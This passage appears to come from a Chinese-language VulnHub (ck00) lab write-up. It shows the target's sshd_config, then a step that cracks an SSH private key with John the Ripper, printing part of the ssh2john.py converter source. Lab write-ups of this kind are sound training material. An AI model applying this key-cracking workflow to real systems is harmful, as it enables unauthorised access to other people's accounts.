class="bash">AuthorizedKeysCommandUser nobody</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For this to work you will also need host keys <span class="keyword">in</span> /etc/ssh/ssh_known_hosts</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostbasedAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to yes <span class="keyword">if</span> you don<span class="string">&#x27;t trust ~/.ssh/known_hosts for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HostbasedAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreUserKnownHosts no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t read the user&#x27;</span>s ~/.rhosts and ~/.shosts files</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreRhosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">disable</span> tunneled clear text passwords, change to no here!</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PasswordAuthentication yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitEmptyPasswords no</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to no to <span class="built_in">disable</span> s/key passwords</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChallengeResponseAuthentication yes</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Kerberos options</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosTicketCleanup yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosGetAFSToken no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosUseKuserok yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> GSSAPI options</span></span><br><span class="line">GSSAPIAuthentication yes</span><br><span class="line">GSSAPICleanupCredentials no</span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIStrictAcceptorCheck yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIKeyExchange no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIEnablek5users no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set this to <span class="string">&#x27;yes&#x27;</span> to <span class="built_in">enable</span> PAM authentication, account processing,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the setting of <span class="string">&quot;PermitRootLogin without-password&quot;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication, <span class="keyword">then</span> <span class="built_in">enable</span> this but <span class="built_in">set</span> PasswordAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and ChallengeResponseAuthentication to <span class="string">&#x27;no&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WARNING: <span class="string">&#x27;UsePAM no&#x27;</span> is not supported <span class="keyword">in</span> Red Hat Enterprise Linux and may cause several</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> problems.</span></span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowAgentForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowTcpForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GatewayPorts no</span></span><br><span class="line">X11Forwarding yes</span><br><span class="line"><span class="meta">#</span><span class="bash">X11DisplayOffset 10</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11UseLocalhost yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTTY yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintMotd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintLastLog yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TCPKeepAlive yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseLogin no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UsePrivilegeSeparation sandbox</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitUserEnvironment no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Compression delayed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveCountMax 3</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ShowPatchLevel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseDNS yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PidFile /var/run/sshd.pid</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxStartups 10:30:100</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTunnel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChrootDirectory none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VersionAddendum none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no default banner path</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Banner none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Accept locale-related environment variables</span></span><br><span class="line">AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES</span><br><span class="line">AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT</span><br><span class="line">AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE</span><br><span class="line">AcceptEnv XMODIFIERS</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> override default of no subsystems</span></span><br><span class="line">Subsystem       sftp    /usr/libexec/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Match User anoncvs</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       X11Forwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       AllowTcpForwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       PermitTTY no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       ForceCommand cvs server</span></span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x08-john破解"><a href="#0x08-john破解" class="headerlink" title="0x08.john破解"></a>0x08.john破解</h2><p><code>先hashid_rsa</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydW9uZ2ttYS9jdGYtdG9vbHMvYmxvYi9tYXN0ZXIvSm9obi9ydW4vc3Nobmcyam9obi5weQ==">tools地址<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> md5 <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"></span><br><span class="line">limited = <span class="literal">True</span>  <span class="comment"># set to False for &quot;development&quot; mode!</span></span><br><span class="line"></span><br><span class="line">PY3 = sys.version_info[<span class="number">0</span>] == <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> PY3:</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3, AES</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    AES = Object()</span><br><span class="line">    AES.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    DES3 = Object()</span><br><span class="line">    DES3.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    limited = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BERException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BER</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Robey&#x27;s tiny little attempt at a BER decoder.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, content=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.content = content</span><br><span class="line">        self.idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;BER(\&#x27;&#x27;</span> + repr(self.content) + <span class="string">&#x27;\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.decode_next()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ident = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (ident &amp; <span class="number">31</span>) == <span class="number">31</span>:</span><br><span class="line">            <span class="comment"># identifier &gt; 30</span></span><br><span class="line">            ident = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> self.idx &lt; 